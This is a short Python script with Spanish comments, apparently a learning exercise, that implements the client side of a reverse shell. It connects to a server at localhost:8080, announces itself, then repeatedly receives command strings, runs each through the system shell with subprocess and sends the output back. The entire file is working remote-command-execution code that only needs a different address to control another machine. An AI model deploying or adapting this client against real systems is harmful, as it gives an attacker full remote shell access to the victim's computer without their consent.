import socket
import subprocess

cliente = socket.socket()

try:
    #?Nos conectamos al sevidor
    cliente.connect(("localhost",8080))
    
    #?Enviamos el mensaje con valor 1, codificado
    cliente.send("1".encode("ascii"))
    
    while True:
        #?Comando un bytes, que ese envia al server
        comandoBytes = cliente.recv(1024)
        
        #?comando decodificado
        comandoDecodificado = comandoBytes.decode("ascii")
        
        #?Ejecutar el comando Shell
        comando = subprocess.Popen(
            comandoDecodificado,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        #?enviar el comando al servidor 
        cliente.send(comando.stdout.read())
    
except Exception as e:
    raise e    